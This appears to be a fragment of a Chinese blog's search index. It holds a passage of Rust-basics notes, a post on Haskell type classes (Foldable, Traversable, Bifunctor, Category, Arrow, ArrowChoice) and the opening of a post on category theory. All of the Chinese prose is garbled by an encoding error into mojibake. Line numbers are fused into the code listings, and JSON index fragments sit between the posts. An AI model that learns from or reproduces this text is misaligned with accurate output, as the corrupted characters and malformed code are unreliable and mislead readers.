æ•°æ®ç±»å‹Rustæ˜¯é™æ€ç±»å‹è¯­è¨€ï¼Œç¼–è¯‘å™¨éœ€è¦åœ¨ç¼–è¯‘æ—¶å¾—åˆ°æ‰€æœ‰å˜é‡çš„ç±»å‹ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥è‡ªåŠ¨æ¨æµ‹ç±»å‹ã€‚ Rustä¸­çš„ç±»å‹åˆ†ä¸ºä¸¤ç§ï¼Œæ ‡é‡ï¼ˆscalarï¼‰å’Œå¤åˆï¼ˆcompoundï¼‰ scalaræ•´å‹ï¼š é•¿åº¦ æœ‰ç¬¦å· æ— ç¬¦å· 8-bit i8 u8 16-bit i16 u16 32-bit i32 u32 64-bit i64 u64 128-bit i128 u128 arch isize usize isizeå’Œusizeæ˜¯æ ¹æ®ç³»ç»Ÿè€Œå®šï¼ˆ32/64ï¼‰ åŒæ—¶æ•´å‹çš„å€¼ä¹Ÿå¯ä»¥ç”¨ä¸åŒè¿›åˆ¶è¡¨ç¤ºï¼ˆåå…­è¿›åˆ¶0xå¼€å¤´ï¼Œå…«è¿›åˆ¶0oå¼€å¤´ï¼ŒäºŒè¿›åˆ¶0bå¼€å¤´ï¼Œå•å­—èŠ‚å­—ç¬¦bå¼€å¤´ï¼ˆbâ€™Aâ€™ï¼‰ï¼‰ï¼Œåœ¨æ•°å€¼ä¸­é—´ä¹Ÿå¯ä»¥å¢åŠ _æ¥å¢å¼ºå¯è¯»æ€§ï¼Œåœ¨æ•°å€¼ç»“å°¾ä¹Ÿå¯ä»¥åŠ ä¸Šç±»å‹åç¼€æ¥æ˜ç¡®ç±»å‹ æµ®ç‚¹å‹ï¼šå•ç²¾åº¦æµ®ç‚¹f32ï¼ŒåŒç²¾åº¦æµ®ç‚¹f64 å¸ƒå°”å‹ï¼šboolï¼Œå€¼æ˜¯å°å†™true/false å­—ç¬¦å‹ï¼šcharï¼Œå››å­—èŠ‚ï¼ˆä½¿ç”¨unicodeï¼‰ã€‚å­—ç¬¦æ˜¯å•å¼•å·è€Œå­—ç¬¦ä¸²æ˜¯åŒå¼•å· compoundå…ƒç»„ï¼šå…ƒç´ ç±»å‹å¯ä»¥ä¸åŒï¼Œä½†æ˜¯æ•´ä¸ªå…ƒç»„çš„ç±»å‹å’Œå„ä¸ªå…ƒç´ çš„ç±»å‹éƒ½æœ‰å…³ï¼Œä¾‹å¦‚ï¼š 1let tup: (i32, f64, u8) = (500, 6.4, 1); å¯ä»¥é€šè¿‡.åŠ ç´¢å¼•æ¥è®¿é—®å…ƒç´ ï¼š 1let x = tup.1 åˆ—è¡¨ï¼šä¸åŒäºPython/Haskellï¼ŒRustä¸­çš„åˆ—è¡¨çš„é•¿åº¦ä¹Ÿæ˜¯ä¸å¯å˜çš„ï¼Œè€Œä¸”åˆ—è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ çš„ç±»å‹ä¹Ÿå¿…é¡»ä¸€è‡´ã€‚å«æœ‰äº”ä¸ªi32ç±»å‹çš„å…ƒç´ çš„åˆ—è¡¨çš„ç±»å‹å°±å¯ä»¥å†™æˆ[i32; 5] åŒæ—¶[3; 5]è¿™ç§å†™æ³•ä¹Ÿç­‰ä»·äº[3, 3, 3, 3, 3] å¯ä»¥é€šè¿‡[index]æ¥è®¿é—®å…ƒç´ ï¼Œå¦‚lst[1]ã€‚ä½†å¦‚æœç´¢å¼•è¶…å‡ºåˆ—è¡¨å…ƒç´ ä¸ªæ•°ï¼Œé‚£ä¹ˆç¼–è¯‘å°†ä¸ä¼šæŠ¥é”™ï¼Œä½†è¿è¡Œæ—¶ä¼šæŠ¥é”™ å‡½æ•°é€šè¿‡fnå…³é”®å­—æ¥å®šä¹‰å‡½æ•°ï¼Œå‚æ•°çš„ç±»å‹å¿…é¡»æŒ‡å®šï¼Œå¦‚æœæœ‰è¿”å›å€¼ï¼Œè¿”å›å€¼çš„ç±»å‹ä¹Ÿè¦åœ¨()åé¢ç”¨-&gt; typeæŒ‡å®šã€‚è¿”å›å€¼å¯ä»¥åœ¨å‡½æ•°ä¸­é€”ç›´æ¥returnè¿”å›ï¼Œä¹Ÿå¯ä»¥åœ¨å‡½æ•°ç»“å°¾ç›´æ¥å†™å‡ºè¦è¿”å›çš„å€¼ï¼ˆä¸åŠ åˆ†å·ï¼Œæ­¤æ—¶æ˜¯è¡¨è¾¾å¼è€Œä¸æ˜¯è¯­å¥ï¼‰ï¼Œæ¯”å¦‚ï¼š 123fn plus_one(x: i32) -&gt; i32 { x + 1} åŒæ ·ï¼Œç”¨{}æ‹¬ä¸Šçš„ä»£ç å—ä¹Ÿæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå®ƒä¹Ÿå¯ä»¥æœ‰è¿”å›å€¼ï¼š 12345let x = 5;let y = { let x = 3; x + 1}; æ§åˆ¶æµæ¡ä»¶å¸¸è§„çš„ifè¯­å¥ï¼Œæ¯”å¦‚ï¼š 1234567if a == 1 { ...;} else if a == 2 { ...;} else { ...;} ä¸åŒäºHaskellï¼Œå®ƒå¯ä»¥æ²¡æœ‰elseåªæœ‰if ifè¯­å¥ä¹Ÿå¯ä»¥ç”¨åœ¨letä¸Šï¼Œè¿™æ—¶{}ä¸­è¦æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼è€Œä¸æ˜¯è¯­å¥ï¼Œå³ä¸å¸¦åˆ†å·ï¼š 12345let number = if condition { 5} else { 6}; å¾ªç¯loopï¼šä½¿ç”¨loopä¼šå°†å—ä¸€ç›´å¾ªç¯ç›´åˆ°é‡åˆ°breakï¼Œä¹Ÿå¯ä»¥ä»loopå¾ªç¯è¿”å›å€¼ï¼Œæ¯”å¦‚ï¼š 123456789let mut counter = 0;let result = loop { counter += 1; if counter == 10 { break counter * 2; }}; whileï¼š 123while condition { ...;} forï¼š 123for element in lst.iter() { ...;} æ‰€æœ‰æƒé¸½äº†ï¼Œæ˜å¤©å†å†™ Reference Rustç¨‹åºè®¾è®¡è¯­è¨€ ç®€ä½“ä¸­æ–‡ç‰ˆ","link":"/p/db45bee5.html"},{"title":"ã€ŒLearn Haskellã€#7 ä¸€äº›å…¶å®ƒç±»å‹ç±»","text":"&lt; #6 #A &gt; FoldableFoldableæ˜¯è¡¨ç¤ºå¯ä»¥æŠ˜å ï¼ˆfoldï¼‰çš„ç±»å‹ç±»ï¼Œåœ¨Data.Foldableä¸­å®šä¹‰ï¼Œè¿™ä½¿å¾—å’Œfoldç›¸å…³çš„å‡½æ•°å¯ä»¥ç”¨åœ¨ä»»æ„Foldableçš„å®ä¾‹ç±»å‹ä¸Šã€‚å®ƒçš„å®šä¹‰æ˜¯ï¼š 12345678910111213141516171819class Foldable t where fold :: Monoid m =&gt; t m -&gt; m foldMap :: Monoid m =&gt; (a -&gt; m) -&gt; t a -&gt; m foldMap' :: Monoid m =&gt; (a -&gt; m) -&gt; t a -&gt; m foldr :: (a -&gt; b -&gt; b) -&gt; b -&gt; t a -&gt; b foldr' :: (a -&gt; b -&gt; b) -&gt; b -&gt; t a -&gt; b foldl :: (b -&gt; a -&gt; b) -&gt; b -&gt; t a -&gt; b foldl' :: (b -&gt; a -&gt; b) -&gt; b -&gt; t a -&gt; b foldr1 :: (a -&gt; a -&gt; a) -&gt; t a -&gt; a foldl1 :: (a -&gt; a -&gt; a) -&gt; t a -&gt; a toList :: t a -&gt; [a] null :: t a -&gt; Bool length :: t a -&gt; Int elem :: Eq a =&gt; a -&gt; t a -&gt; Bool maximum :: Ord a =&gt; t a -&gt; a minimum :: Ord a =&gt; t a -&gt; a sum :: Num a =&gt; t a -&gt; a product :: Num a =&gt; t a -&gt; a {-# MINIMAL foldMap | foldr #-} æœ€å°‘åªè¦å®ç°foldrå’ŒfoldMapå…¶ä¸­ä¹‹ä¸€å°±å¯ä»¥ä½¿ä¸€ä¸ªç±»å‹æˆä¸ºFoldableçš„å®ä¾‹ï¼Œå…¶å®ƒçš„å‡½æ•°éƒ½æœ‰ç”±è¿™ä¸¤ä¸ªå‡½æ•°æä¾›çš„é»˜è®¤å®ç°ï¼Œè€Œä¸”è¿™ä¸¤ä¸ªå‡½æ•°ä¹‹é—´ä¹Ÿæœ‰ç›¸äº’å®ç°ã€‚å› æ­¤åªè¦å®ç°foldræˆ–foldMapä¸€ä¸ªå‡½æ•°å°±å¯ä»¥ä½¿ç”¨æ‰€æœ‰å…¶å®ƒFoldableä¸­çš„å‡½æ•°ã€‚foldrå‡½æ•°åœ¨å‰é¢å·²ç»æœ‰å­¦è¿‡ï¼ŒfoldMapçš„ä¾‹å­æ˜¯ï¼š 123456ghci&gt; foldMap Sum [1, 3, 5]Sum {getSum = 9}ghci&gt; foldMap Product [1, 3, 5]Product {getProduct = 15}ghci&gt; foldMap (replicate 3) [1, 2, 3][1,1,1,2,2,2,3,3,3] Foldableå®ä¾‹[]ã€Maybeã€Either aã€(,) aéƒ½æ˜¯Foldableçš„å®ä¾‹ï¼Œæ ‡å‡†å®¹å™¨åº“ä¸­çš„Mapã€Setç­‰ä¹Ÿéƒ½æ˜¯Foldableçš„å®ä¾‹ã€‚ä¹Ÿå¯ä»¥è‡ªå®šä¹‰äºŒå‰æ ‘ç±»å‹ï¼Œå¹¶ä½¿å…¶æˆä¸ºFoldableçš„å®ä¾‹ï¼š 1234567data Tree a = Empty | Leaf a | Node (Tree a) a (Tree a)instance Foldable Tree where foldMap :: Monoid m =&gt; (a -&gt; m) -&gt; Tree a -&gt; m foldMap f Empty = mempty foldMap f (Leaf x) = f x foldMap f (Node l k r) = foldMap f l `mappend` f k `mappend` foldMap f r å¸¸ç”¨å‡½æ•° asum :: (Alternative f, Foldable t) =&gt; t (f a) -&gt; f aï¼Œç”¨&lt;|&gt;é€ä¸ªè¿æ¥æ‰€æœ‰å…ƒç´  sequenceA_ :: (Applicative f, Foldable t) =&gt; t (f a) -&gt; f ()ï¼Œç”±äºä¸¢å¼ƒç»“æœï¼Œæ‰€ä»¥Foldable tå°±å¯ä»¥æ»¡è¶³ï¼›å› æ­¤ä¸åŒäºsequenceAéœ€è¦Traversable traverse_ :: (Applicative f, Foldable t) =&gt; (a -&gt; f b) -&gt; t a -&gt; f () for_ :: (Applicative f, Foldable t) =&gt; t a -&gt; (a -&gt; f b) -&gt; f () TraversableTraversableæ˜¯è¡¨ç¤ºå¯éå†çš„ç±»å‹ç±»ï¼Œåœ¨Data.Traversableæ¨¡å—ä¸­å®šä¹‰ï¼Œå®ƒæ˜¯Foldableçš„å‡çº§ç‰ˆï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªFunctorï¼Œå®ƒçš„å®šä¹‰æ˜¯ï¼š 123456class (Functor t, Foldable t) =&gt; Traversable t where traverse :: Applicative f =&gt; (a -&gt; f b) -&gt; t a -&gt; f (t b) sequenceA :: Applicative f =&gt; t (f a) -&gt; f (t a) mapM :: Monad m =&gt; (a -&gt; m b) -&gt; t a -&gt; m (t b) sequence :: Monad m =&gt; t (m a) -&gt; m (t a) {-# MINIMAL traverse | sequenceA #-} æœ€å°‘åªéœ€è¦å®ç°traverseå‡½æ•°æˆ–è€…sequenceAå‡½æ•°ã€‚å…¶ä¸­å„ä¸ªå‡½æ•°çš„åŠŸèƒ½é€šè¿‡ç±»å‹ç­¾åä¹Ÿéƒ½èƒ½æ¨æµ‹å‡ºæ¥ã€‚ä½†æ˜¯å…¶ä¸­mapMå°±æ˜¯traverseï¼Œsequenceå°±æ˜¯sequenceAï¼Œå®ƒä»¬å­˜åœ¨åªæ˜¯å†å²é—ç•™ï¼ˆ Traversableå®ä¾‹1234567891011121314151617instance Traversable Maybe where traverse _ Nothing = pure Nothing traverse f (Just x) = Just &lt;$&gt; f xinstance Traversable [] where {-# INLINE traverse #-} traverse f = foldr cons_f (pure []) where cons_f x ys = liftA2 (:) (f x) ysinstance Traversable (Either a) where traverse _ (Left x) = pure (Left x) traverse f (Right y) = Right &lt;$&gt; f yinstance Traversable ((,) a) where traverse f (x, y) = (,) x &lt;$&gt; f y... ä¸Šé¢çš„Treeä¹Ÿå¯ä»¥æˆä¸ºTraversableçš„å®ä¾‹ï¼š 123456789101112131415instance Functor Tree where fmap :: (a -&gt; b) -&gt; Tree a -&gt; Tree b fmap g Empty = Empty fmap g (Leaf x) = Leaf $ g x fmap g (Node l x r) = Node (fmap g l) (g x) (fmap g r)instance Traversable Tree where traverse :: Applicative f =&gt; (a -&gt; f b) -&gt; Tree a -&gt; f (Tree b) traverse g Empty = pure Empty traverse g (Leaf x) = Leaf &lt;$&gt; g x traverse g (Node l x r) = Node &lt;$&gt; traverse g l &lt;*&gt; g x &lt;*&gt; traverse g r Traversable LawsTraversableä¹Ÿæœ‰ä¸¤æ¡å®šå¾‹ï¼š traverse Identity = Identity traverse (Compose . fmap g . f) = Compose . fmap (traverse g) . traverse f å…¶ä¸­Identityå’ŒComposeåˆ†åˆ«å®šä¹‰åœ¨Data.Functor.Identityå’ŒData.Functor.Composeä¸¤ä¸ªæ¨¡å—ä¸­ï¼š 12newtype Identity a = Identity { runIdentity :: a } deriving (...)newtype Compose f g a = Compose { getCompose :: f (g a) } deriving (...) BifunctorFunctorçš„å®ä¾‹çš„kindéƒ½æ˜¯* -&gt; *ï¼Œå› æ­¤fmapåªèƒ½å°†ä¸€ä¸ªå‡½æ•°æ˜ å°„åˆ°ä¸€ä¸ªå€¼ä¸Šã€‚è€ŒBifunctorï¼ˆåœ¨Data.Bifunctoræ¨¡å—ä¸­å®šä¹‰ï¼‰çš„å®ä¾‹çš„kindæ˜¯* -&gt; * -&gt; *ï¼Œè€Œä¸”å®ƒçš„bimapå¯ä»¥åŒæ—¶å°†ä¸¤ä¸ªå‡½æ•°æ˜ å°„åˆ°ä¸¤ä¸ªå€¼ä¸Šï¼š 12345class Bifunctor p where bimap :: (a -&gt; b) -&gt; (c -&gt; d) -&gt; p a c -&gt; p b d first :: (a -&gt; b) -&gt; p a c -&gt; p b c second :: (b -&gt; c) -&gt; p a b -&gt; p a c {-# MINIMAL bimap | first, second #-} åŒæ—¶bimapå’Œfirst,secondä¹‹é—´ä¹Ÿå¯ä»¥ç›¸äº’è½¬æ¢ï¼š 1234bimap f g = first f . second gfirst f = bimap f idsecond g = bimap id g å¯¹äºFunctorï¼Œ((,) e)å’ŒEither eæ‰æ˜¯Functorçš„å®ä¾‹ï¼Œå› ä¸ºä»–ä»¬æ˜¯* -&gt; *ã€‚ä½†æ˜¯å¯¹äºBifunctorï¼Œ(,)å’ŒEitherå°±æ˜¯Bifunctorçš„å®ä¾‹ï¼š 12ghci&gt; bimap (+1) length (4, [1,2,3])(5,3) Bifunctor Laws bimap id id = id first id = id second id = id bimap (f . g) (h . i) = bimap f h . bimap g i first (f . g) = first f . first g second (f . g) = second f . second g CategoryHaskellä¸­çš„Categoryå°†ä¸€èˆ¬çš„å‡½æ•°æ¨å¹¿åˆ°äº†æ™®éçš„æ€å°„ä¸Šï¼Œå®ƒåœ¨Control.Categoryæ¨¡å—ä¸­ï¼Œå®šä¹‰æ˜¯ï¼š 123class Category cat where id :: cat a a (.) :: cat b c -&gt; cat a b -&gt; cat a c å®ƒçš„å®ä¾‹æœ‰(-&gt;)å’ŒKleisli mï¼š 123instance Category (-&gt;) where id = GHC.Base.id (.) = (GHC.Base..) Kleisliæ˜¯ä¸€ä¸ªèŒƒç•´ï¼Œç”¨æ¥è¡¨ç¤ºå‡½æ•°a -&gt; m bï¼ŒHaskellä¸­ï¼Œå®ƒåœ¨Control.Arrowæ¨¡å—ä¸­å®šä¹‰ï¼š 12345678newtype Kleisli m a b = Kleisli { runKleisli :: a -&gt; m b }instance Monad m =&gt; Category (Kleisli m) where id :: Kleisli m a a id = Kleisli return (.) :: Kleisli m b c -&gt; Kleisli m a b -&gt; Kleisli m a c Kleisli g . Kleisli h = Kleisli (h &gt;=&gt; g) Categoryè¦æ»¡è¶³çš„å®šå¾‹åªæœ‰idæ˜¯(.)æ“ä½œçš„å•ä½å…ƒï¼Œä»¥åŠ(.)æ“ä½œæ˜¯å¯ç»“åˆçš„ åŒæ—¶Categoryè¿˜æä¾›äº†ä¸¤ä¸ªå‡½æ•°&lt;&lt;&lt;å’Œ&gt;&gt;&gt;ï¼š 12345(&lt;&lt;&lt;) :: Category cat =&gt; cat b c -&gt; cat a b -&gt; cat a c(&lt;&lt;&lt;) = (.)(&gt;&gt;&gt;) :: Category cat =&gt; cat a b -&gt; cat b c -&gt; cat a c f &gt;&gt;&gt; g = g . f ArrowArrowå°†å‡½æ•°è¿›ä¸€æ­¥æŠ½è±¡åŒ–ï¼Œå®ƒå®šä¹‰åœ¨Control.Arrowæ¨¡å—ä¸­ï¼š 1234567class Category a =&gt; Arrow a where arr :: (b -&gt; c) -&gt; a b c first :: a b c -&gt; a (b, d) (c, d) second :: a b c -&gt; a (d, b) (d, c) (***) :: a b c -&gt; a b' c' -&gt; a (b, b') (c, c') (&amp;&amp;&amp;) :: a b c -&gt; a b c' -&gt; a b (c, c') {-# MINIMAL arr, (first | (***)) #-} å…¶ä¸­ï¼š arrå‡½æ•°å°†ä¸€ä¸ªå‡½æ•°å˜æˆä¸€ä¸ªArrow firstå‡½æ•°å°†ä¸€ä¸ªArrowå˜æˆä¸€ä¸ªäºŒå…ƒç»„é—´çš„Arrowï¼Œä¸”åªä¼šå¯¹ä¸€ä¸ªå…ƒç´ è¿›è¡Œæ“ä½œï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¿æŒä¸å˜ secondå‡½æ•°ä¸firstç›¸åï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¿æŒä¸å˜ ***å‡½æ•°æ˜¯Arrowä¹‹é—´çš„parallel compositionï¼Œå¯¹äºå‡½æ•°: (g *** h) (x, y) = (g x, h y) &amp;&amp;&amp;å‡½æ•°æ˜¯Arrowä¹‹é—´çš„fanout compositionï¼Œå¯¹äºå‡½æ•°: (g &amp;&amp;&amp; h) x = (g x, h x) å®ƒçš„å®ä¾‹ä¹Ÿæœ‰(-&gt;)å’ŒKleisliï¼š 1234567891011121314instance Arrow (-&gt;) where arr :: (b -&gt; c) -&gt; (b -&gt; c) arr g = g first :: (b -&gt; c) -&gt; ((b,d) -&gt; (c,d)) first g (x,y) = (g x, y)instance Monad m =&gt; Arrow (Kleisli m) where arr :: (b -&gt; c) -&gt; Kleisli m b c arr f = Kleisli (return . f) first :: Kleisli m b c -&gt; Kleisli m (b,d) (c,d) first (Kleisli f) = Kleisli (\\ ~(b,d) -&gt; do c &lt;- f b return (c,d) ) å¸¸ç”¨å‡½æ•°ï¼š 1234567891011121314returnA :: Arrow a =&gt; a b breturnA = arr id(^&gt;&gt;) :: Arrow a =&gt; (b -&gt; c) -&gt; a c d -&gt; a b df ^&gt;&gt; a = arr f &gt;&gt;&gt; a(&gt;&gt;^) :: Arrow a =&gt; a b c -&gt; (c -&gt; d) -&gt; a b da &gt;&gt;^ f = a &gt;&gt;&gt; arr f(&lt;&lt;^) :: Arrow a =&gt; a c d -&gt; (b -&gt; c) -&gt; a b da &lt;&lt;^ f = a &lt;&lt;&lt; arr f(^&lt;&lt;) :: Arrow a =&gt; (c -&gt; d) -&gt; a b c -&gt; a b df ^&lt;&lt; a = arr f &lt;&lt;&lt; a Arrow notationç±»ä¼¼do-notationï¼ŒArrowä¹Ÿæä¾›äº†ä¸€å¥—æ–¹ä¾¿çš„è¯­å¥ï¼š 1234proc x -&gt; do y &lt;- action1 -&lt; ... z &lt;- action2 -&lt; ... returnA -&lt; ... å…¶ä¸­procä»£æ›¿äº†lambdaè¡¨è¾¾å¼ä¸­çš„æ–œæ \\ï¼Œ-&lt;å³è¾¹çš„ä¸ºè¾“å…¥ï¼Œå·¦è¾¹çš„ä¸ºæ¥æ”¶è¾“å…¥çš„å‡½æ•°ã€‚æ¯”å¦‚ï¼Œä¸‹é¢ä¸‰ç§å†™æ³•è¾¾æˆçš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼š 12345678910111213141516171819202122232425262728f :: Int -&gt; (Int, Int)f = \\x -&gt; let y = 2 * x z1 = y + 3 z2 = y - 5 in (z1, z2) -- ghci&gt; f 10 -- (23,15)fM :: Int -&gt; Identity (Int, Int)fM = \\x -&gt; do y &lt;- return (2 * x) z1 &lt;- return (y + 3) z2 &lt;- return (y - 5) return (z1, z2)-- ghci&gt; runIdentity (fM 10)-- (23,15)fA :: Int -&gt; (Int, Int)fA = proc x -&gt; do y &lt;- (2 *) -&lt; x z1 &lt;- (+ 3) -&lt; y z2 &lt;- (subtract 5) -&lt; y returnA -&lt; (z1, z2)-- ghci&gt; fA 10-- (23,15) ArrowChoice12345678910111213141516171819202122232425262728293031class Arrow a =&gt; ArrowChoice a where left :: a b c -&gt; a (Either b d) (Either c d) left = (+++ id) right :: a b c -&gt; a (Either d b) (Either d c) right = (id +++) (+++) :: a b c -&gt; a b' c' -&gt; a (Either b b') (Either c c') f +++ g = left f &gt;&gt;&gt; arr mirror &gt;&gt;&gt; left g &gt;&gt;&gt; arr mirror where mirror :: Either x y -&gt; Either y x mirror (Left x) = Right x mirror (Right y) = Left y (|||) :: a b d -&gt; a c d -&gt; a (Either b c) d f ||| g = f +++ g &gt;&gt;&gt; arr untag where untag (Left x) = x untag (Right y) = yinstance ArrowChoice (-&gt;) where left f = f +++ id right f = id +++ f f +++ g = (Left . f) ||| (Right . g) (|||) = eitherinstance Monad m =&gt; ArrowChoice (Kleisli m) where left f = f +++ arr id right f = arr id +++ f f +++ g = (f &gt;&gt;&gt; arr Left) ||| (g &gt;&gt;&gt; arr Right) Kleisli f ||| Kleisli g = Kleisli (either f g) ArrowZero &amp; ArrowPlus1234567891011class Arrow a =&gt; ArrowZero a where zeroArrow :: a b cclass ArrowZero a =&gt; ArrowPlus a where (&lt;+&gt;) :: a b c -&gt; a b c -&gt; a b cinstance MonadPlus m =&gt; ArrowZero (Kleisli m) where zeroArrow = Kleisli (\\_ -&gt; mzero)instance MonadPlus m =&gt; ArrowPlus (Kleisli m) where Kleisli f &lt;+&gt; Kleisli g = Kleisli (\\x -&gt; f x `mplus` g x) ä¾‹å­123456789101112131415161718192021222324252627282930ghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) &lt;+&gt; (Kleisli (\\x -&gt; [x, -x]))) 2[4,2,-2]ghci&gt; either (+2) (*3) (Left 3)5ghci&gt; either (+2) (*3) (Right 3)9ghci&gt; (+2) ||| (*3) $ (Left 3)5ghci&gt; (+2) +++ (*3) $ (Left 3)Left 5ghci&gt; (+2) ||| (*3) $ (Right 3)9ghci&gt; (+2) +++ (*3) $ (Right 3)Right 9ghci&gt; left (+2) (Left 3)Left 5ghci&gt; right (*3) (Right 3)Right 9ghci&gt; left (+2) (Right 3)Right 3ghci&gt; right (*3) (Left 3)Left 3ghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) ||| (Kleisli (\\x -&gt; [x, -x]))) (Left 3)[6]ghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) ||| (Kleisli (\\x -&gt; [x, -x]))) (Right 3)[3,-3]ghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) +++ (Kleisli (\\x -&gt; [x, -x]))) (Left 3)[Left 6]ghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) +++ (Kleisli (\\x -&gt; [x, -x]))) (Right 3)[Right 3,Right (-3)] Reference Typeclassopedia - Haskell wiki Haskellè¯­è¨€å­¦ä¹ ç¬”è®°ï¼ˆ40ï¼‰Arrowï¼ˆ1ï¼‰ - zwvista 24 Days of GHC Extensions: Arrows - Tom Ellis Haskellè¯­è¨€å­¦ä¹ ç¬”è®°ï¼ˆ47ï¼‰Arrowï¼ˆ2ï¼‰ - zwvista ç›®å½• #0&nbsp;|&nbsp;æ€»ç« &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#1&nbsp;|&nbsp;åŸºç¡€è¯­æ³•ä¸å‡½æ•°&emsp;&emsp;&emsp;#2&nbsp;|&nbsp;é«˜é˜¶å‡½æ•°ä¸æ¨¡å—&emsp;&emsp;&emsp;#3&nbsp;|&nbsp;ç±»å‹ä¸ç±»å‹ç±»&emsp;&emsp;&emsp;&emsp;#4&nbsp;|&nbsp;è¾“å…¥è¾“å‡ºä¸æ–‡ä»¶&emsp;&emsp;&emsp;#5&nbsp;|&nbsp;å‡½å­ã€åº”ç”¨å‡½å­ä¸å•å­#6&nbsp;|&nbsp;åŠç¾¤ä¸å¹ºåŠç¾¤&emsp;&emsp;&emsp;&emsp;#7&nbsp;|&nbsp;ä¸€äº›å…¶å®ƒç±»å‹ç±»&emsp;&emsp;&emsp;#A&nbsp;|&nbsp;Haskellä¸èŒƒç•´è®º&emsp;&nbsp;&thinsp;","link":"/p/68ef8146.html"},{"title":"ã€ŒLearn Haskellã€#A Haskellä¸èŒƒç•´è®º","text":"Haskellä¸­çš„å‡½å­å•å­ç­‰éƒ½ä¸èŒƒç•´è®ºï¼ˆcategory theoryï¼‰æœ‰å¾ˆå¤šè”ç³»ï¼Œæ‰€ä»¥æ‰“ç®—ç®€å•äº†è§£ä¸€ä¸‹èŒƒç•´è®ºçš„ç›¸å…³å†…å®¹ã€‚ èŒƒç•´è®ºæ˜¯æ•°å­¦çš„ä¸€é—¨å­¦ç§‘ï¼Œä»¥æŠ½è±¡çš„æ–¹æ³•å¤„ç†æ•°å­¦æ¦‚å¿µï¼Œå°†è¿™äº›æ¦‚å¿µå½¢å¼åŒ–æˆä¸€ç»„ç»„çš„â€œç‰©ä»¶â€åŠâ€œæ€å°„â€ã€‚æ•°å­¦ä¸­è®¸å¤šé‡è¦çš„é¢†åŸŸå¯ä»¥å½¢å¼åŒ–ä¸ºèŒƒç•´ã€‚ä½¿ç”¨èŒƒç•´è®ºå¯ä»¥ä»¤è¿™äº›é¢†åŸŸä¸­è®¸å¤šéš¾ç†è§£ã€éš¾æ‰æ‘¸çš„æ•°å­¦ç»“è®ºæ›´å®¹æ˜“å™è¿°è¯æ˜ã€‚ â€”â€”â€”â€” ç»´åŸºç™¾ç§‘ èŒƒç•´ï¼ˆCategoryï¼‰èŒƒç•´æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç®€å•çš„é›†åˆï¼Œä¸€ä¸ªèŒƒç•´$\\mathbf{C}$åŒ…å«ä¸‰ä¸ªç»„æˆæˆåˆ†ï¼š ä¸€ä¸ªç±»$\\mathrm{ob}(\\mathbf{C})$ï¼šå…¶ä¸­å…ƒç´ ç§°ä¸ºå¯¹è±¡ï¼ˆobjectsï¼‰ ä¸€ä¸ªç±»$\\mathrm{hom}(\\mathbf{C})$ï¼šå…¶ä¸­å…ƒç´ ç§°ä¸ºæ€å°„ï¼ˆmorphismsï¼‰ï¼ˆæˆ–ç®­å·ï¼ˆarrowsï¼‰ï¼‰ï¼šæ¯ä¸ªæ€å°„è¿æ¥äº†ä¸¤ä¸ªå¯¹è±¡ï¼šæºå¯¹è±¡ï¼ˆsource objectï¼‰ã€ç›®æ ‡å¯¹è±¡ï¼ˆtarget objectï¼‰ã€‚å¦‚æœ$f$æ˜¯ä»æºå¯¹è±¡$A$åˆ°ç›®æ ‡å¯¹è±¡$B$ï¼ˆ$A, B\\in \\mathrm{ob}(\\mathbf{C})$ï¼‰çš„æ€å°„ï¼Œé‚£ä¹ˆè®°ä¸º$f : A\\to B$ ä¸€ä¸ªäºŒå…ƒè¿ç®—ï¼Œç§°ä¸ºæ€å°„å¤åˆï¼ˆcompositionï¼‰ï¼šä¸¤ä¸ªæ€å°„$g : A\\to B$ã€$f : B\\to C$çš„å¤åˆè®°ä¸º$f\\circ g : A\\to C$åœ¨Haskellå’Œå¤§éƒ¨åˆ†æ•°å­¦ç†è®ºä¸­éƒ½æ˜¯ä»å³å‘å·¦è®¡ç®—ï¼Œå³$f\\circ g$ä¸­æ˜¯å…ˆè®¡ç®—$g : A\\to B$å†è®¡ç®—$f : B\\to C$ è®¸å¤šä¸œè¥¿éƒ½å¯ä»¥ç»„æˆèŒƒç•´ã€‚æ¯”å¦‚: &emsp;$\\mathbf{Set}$æ˜¯ä¸€ä¸ªèŒƒç•´ï¼Œå¯¹è±¡ä¸ºæ‰€æœ‰é›†åˆï¼Œæ€å°„ä¸ºé›†åˆä¹‹é—´çš„å‡½æ•°ï¼Œå¤åˆå³å‡½æ•°ä¹‹é—´çš„å¤åˆ &emsp;$\\mathbf{Grp}$æ˜¯ä¸€ä¸ªèŒƒç•´ï¼Œå¯¹è±¡ä¸ºæ‰€æœ‰ç¾¤ï¼Œæ€å°„ä¸ºç¾¤åŒæ€ï¼ˆgroup homomorphismsï¼‰ï¼Œä¾‹å¦‚å¯¹äºç¾¤$(G,*)$å’Œ$(H,\\cdot )$ï¼Œæœ‰ç¾¤åŒæ€$h : (G,*)\\to (H,\\cdot )$ï¼Œåˆ™éœ€è¦å¯¹äº$G$ä¸­çš„ä»»æ„å…ƒç´ $u,v$æ»¡è¶³$$h(u*v)=h(u)\\cdot h(v)$$ æ³¨æ„ï¼šæ€å°„ä¸å¿…é¡»ä¸ºå‡½æ•°ï¼›è€Œä¸”å¯ä»¥å­˜åœ¨æºå¯¹è±¡å’Œç›®æ ‡å¯¹è±¡éƒ½ç›¸åŒçš„ä¸åŒæ€å°„ èŒƒç•´å…¬ç†æ¯ä¸ªèŒƒç•´éƒ½éœ€è¦æ»¡è¶³ä¸‰æ¡å®šå¾‹ï¼š æ€å°„å¤åˆéœ€è¦æ»¡è¶³ç»“åˆå¾‹ï¼ˆassociativityï¼‰ï¼š$$f\\circ (g\\circ h) = (f\\circ g)\\circ h$$ 